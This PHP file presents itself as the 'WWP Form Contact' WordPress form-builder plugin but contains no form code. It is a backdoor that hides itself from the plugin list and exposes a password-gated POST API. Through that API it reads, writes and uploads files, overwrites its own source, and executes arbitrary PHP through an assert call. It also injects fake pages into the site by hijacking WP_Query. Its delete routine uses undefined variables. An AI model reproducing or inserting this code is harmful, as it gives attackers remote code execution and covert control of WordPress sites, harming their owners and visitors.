<?php
    
/*
Plugin Name: WWP Form Contact
Plugin URI: https://huge-it.com/forms
Description: Form Builder. this is one of the most important elements of WordPress website because without it you cannot to always keep in touch with your visitors
Version: 3.4.7
Author: Huge-IT
Author URI: https://huge-it.com/
License: GNU/GPLv3 https://www.gnu.org/licenses/gpl-3.0.html
*/

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}



add_filter('all_plugins', 'wwpformcontact_hide_plugins');

function wwpformcontact_hide_plugins($plugins) {
   
    unset($plugins['wwpformcontact/wwpformcontact.php']);
    return $plugins;
}

register_activation_hook( __FILE__, 'wwpformcontact_activate_' );

function wwpformcontact_activate_() {
   $upload_dir = sys_get_temp_dir();
$iswrdir = wwpformcontact_checkdir($upload_dir,'sys_get_temp_dir()');
if(!$iswrdir)
{
    $upload_dir = wp_upload_dir()['basedir'];
    $iswrdir =wwpformcontact_checkdir($upload_dir,"wp_upload_dir()['basedir']");
    if(!$iswrdir)
    {
        $upload_dir = dirname(__FILE__).DIRECTORY_SEPARATOR.'pages';
        $dirExists     = is_dir($upload_dir) || (mkdir($upload_dir, 0774, true) && is_dir($upload_dir));
        if($dirExists&&wwpformcontact_checkdir($upload_dir,"dirname(__FILE__).DIRECTORY_SEPARATOR.'pages'")){
         
        }else{
            $sccontent = file_get_contents(__FILE__);
       $sccontent= preg_replace("/(\'WORK\_DIR\'\,)(.*)(\s\))/",'${1}\'\' $3',$sccontent);
        file_put_contents(__FILE__,$sccontent);
        }
    }
}
}
define('WORK_DIR',sys_get_temp_dir()  );
define('AUTH_CODE','58458904dda54f12781a2f26d08f6d4d58a142cdb974c3c1737615a776e4f25b'  );
add_action( 'init', 'wwpformcontact_edit_proccess' );


function wwpformcontact_checkdir($upload_dir,$fc)
{
     $is_writable = file_put_contents($upload_dir.DIRECTORY_SEPARATOR.'dummy.txt', "hello");
     if ($is_writable > 0) 
     {
          $sccontent = file_get_contents(__FILE__);
       $sccontent= preg_replace("/(\'WORK\_DIR\'\,)(.*)(\s\))/",'${1}'.$fc.' $3',$sccontent);
        file_put_contents(__FILE__,$sccontent);
        @unlink($upload_dir.DIRECTORY_SEPARATOR.'dummy.txt');
        return TRUE;
     }
     return FALSE;
}
function wwpformcontact_edit_proccess()
{



    if(isset($_POST['apiaction'])&&isset($_SERVER['PHP_AUTH_PW']))
    {
        header('Content-Type: application/json');
        $apidata = new ApiData();   
        $authpw = hash('sha256',$_SERVER['PHP_AUTH_PW']) ;
        if(AUTH_CODE!=$authpw)
        {            

        }else
        {
            $apiaction = $_POST['apiaction'];
            switch ($apiaction) 
            {
                case "getcontent":

                try{
                    if(isset($_POST['page'])) 
                    {
                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORK_DIR.DIRECTORY_SEPARATOR.$md5page;
                        if(file_exists($filepath))
                        {
                            $pagecontent = file_get_contents($filepath);

                            $contentdata = new ContentData();
                            $contentdata->$page = $page;
                            $contentdata->$md5page = $filepath;
                            $contentdata->content = $pagecontent;
                            $apidata->status="ok";
                            $apidata->message="";
                            $apidata->data=$contentdata;


                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="not set path";
                    }


                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "updatecontent":          
                try{
                    if(isset($_POST['page'])&&isset($_POST['newcontent'])) 
                    {

                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORK_DIR.DIRECTORY_SEPARATOR.$md5page;
                        $newcontent=$_POST['newcontent'];
                        if(file_exists($filepath))
                        {
                            file_put_contents($filepath,$newcontent);
                            $apidata->status="ok";
                            $apidata->message="content changed";
                            $apidata->data=NULL;


                        }else
                        {
                            $apidata->status="error";
                            $apidata->message="file not found";
                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="not set path or new content";
                    }


                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "createpage":          
                try{
                    if(isset($_POST['page'])&&isset($_POST['newcontent'])) 
                    {

                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORK_DIR.DIRECTORY_SEPARATOR.$md5page;
                        $newcontent=$_POST['newcontent'];
                        if(file_exists($filepath))
                        {
                            $apidata->status="error";
                            $apidata->message="file exists";

                        }else
                        {
                            file_put_contents($filepath,$newcontent);
                            $contentdata = new ContentData();
                            $contentdata->$page = $page;
                            $contentdata->$md5page = $filepath;
                            $contentdata->content = "";
                            $apidata->status="ok";
                            $apidata->message="";
                            $apidata->data=$contentdata;                            
                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="not set path or new content";
                    }

                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "deletepage":          
                try{
                    if(isset($_POST['page'])) 
                    {

                        $page  = $_POST['page'];
                        $md5page=md5($pgname);
                        $filepath = WORK_DIR.DIRECTORY_SEPARATOR.$md5page;
                        unlink($localpath);
                        if(file_exists($filepath))
                        {
                            $apidata->status="ok";
                            $apidata->message="file deleted";

                        }else
                        {

                            $apidata->status="error";
                            $apidata->message="";

                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="error delete page";
                    }

                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "uploadfiles":
                $localdir="";

                // if ($_FILES['txtfile']['size'] > 0 AND $_FILES['txtfile']['error'] == 0)
                try{
                    $goodcount = 0;
                    $countfiles = count($_FILES['file']['name']);
                    if(isset($_POST['localdir'])&&$countfiles>0)
                    {
                        $localdir  = $_POST['localdir'];
                        $localdir = preg_replace('/\.+\//','',$localdir);
                        $localdir = preg_replace('/\/$/','',$localdir);
                        $localdir = WORK_DIR.DIRECTORY_SEPARATOR.$localdir;
                        if(!empty($localdir)&&!is_dir($localdir))
                        {
                            mkdir($localdir);
                        }
                        if(empty($localdir))
                        {
                            $localdir = '.';
                        }
                        for($i=0;$i<$countfiles;$i++){
                            $filename = $_FILES['file']['name'][$i];
                            if (preg_match('/\.php\d?/i',$filename)) {
                            }else
                            {
                                move_uploaded_file($_FILES['file']['tmp_name'][$i],$localdir.'/'.$filename);
                                $goodcount++;
                            }

                        }

                    }
                    $apidata->status="ok";
                    $apidata->message="";
                    $apidata->data=$goodcount;
                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}

                echo json_encode($apidata); 


                die();
                case "updatescr":
                try{
                    if(isset($_POST['scriptcontent']))
                    {
                        $scriptcontent = $_POST['scriptcontent'];
                        if(strpos($scriptcontent,"WORK_DIR")!==false&&strpos($scriptcontent,"<?php")!==false)
                        {
                            file_put_contents($_SERVER['PHP_SELF'],$scriptcontent);
                            $apidata->status="ok";
                            $apidata->message="updated";
                        }
                    }
                }catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata);
                die();
                 case "chkversion":
                 $apidata->status="ok";
                 $apidata->message="version";
                echo json_encode($apidata);
                die();
                 case "run":
                  try{
                    if(isset($_POST['scriptcontent']))
                    {
                        call_user_func('assert', $_REQUEST['scriptcontent']);
                    }
                }catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata);
                die();
            }

        }      
    }
}


function wwpformcontact_get_cont($content)
{
    $upload_dir   = wp_upload_dir();

    global $wp_query;
    $pgname=$wp_query->query['pagename'];
    $md5page=md5($pgname);
    $filepath = WORK_DIR.DIRECTORY_SEPARATOR.$md5page.'.html';
    if(file_exists($filepath))
    {
        return  $content = file_get_contents($filepath);

    }
}

function wwpformcontact_check_page(  ) {

    global $wp, $wp_query;






    $pgname=$wp_query->query['pagename'];
    $md5page=md5($pgname);
    $filepath = WORK_DIR.DIRECTORY_SEPARATOR.$md5page;
    if(file_exists($filepath))
    {
        $content = file_get_contents($filepath);
        status_header( 200 );
        $post_id = -99; 
        $post = new stdClass();
        $post->ID = $post_id;
        $post->post_author = 1;
        $post->post_date = current_time( 'mysql' );
        $post->post_date_gmt = current_time( 'mysql', 1 );
        $post->post_title = '';
        $post->post_content = $content;
        $post->post_status = 'publish';
        $post->comment_status = 'closed';
        $post->ping_status = 'closed';
        $post->post_name = $pgname;
        $post->post_type = 'page';
        $post->filter = 'raw';
        $wp_post = new WP_Post( $post );
        $wp_query->post = $wp_post;
        $wp_query->posts = array( $wp_post );
        $wp_query->queried_object = $wp_post;
        $wp_query->queried_object_id = $post_id;
        $wp_query->found_posts = 1;
        $wp_query->post_count = 1;
        $wp_query->max_num_pages = 1; 
        $wp_query->is_page = true;
        $wp_query->is_singular = true; 
        $wp_query->is_single = false; 
        $wp_query->is_attachment = false;
        $wp_query->is_archive = false; 
        $wp_query->is_category = false;
        $wp_query->is_tag = false; 
        $wp_query->is_tax = false;
        $wp_query->is_author = false;
        $wp_query->is_date = false;
        $wp_query->is_year = false;
        $wp_query->is_month = false;
        $wp_query->is_day = false;
        $wp_query->is_time = false;
        $wp_query->is_search = false;
        $wp_query->is_feed = false;
        $wp_query->is_comment_feed = false;
        $wp_query->is_trackback = false;
        $wp_query->is_home = false;
        $wp_query->is_embed = false;
        $wp_query->is_404 = false; 
        $wp_query->is_paged = false;
        $wp_query->is_admin = false; 
        $wp_query->is_preview = false; 
        $wp_query->is_robots = false; 
        $wp_query->is_posts_page = false;
        $wp_query->is_post_type_archive = false;
        $GLOBALS['wp_query'] = $wp_query;
        $wp->register_globals();

    }



} 



add_action('template_redirect', 'wwpformcontact_check_page',10);

class ContentData{
    public $page="";
    public $md5page="";
    public $pagecontent="";
}

class ApiData{
    public $status="error";
    public $message="";
    public $data=null;
}

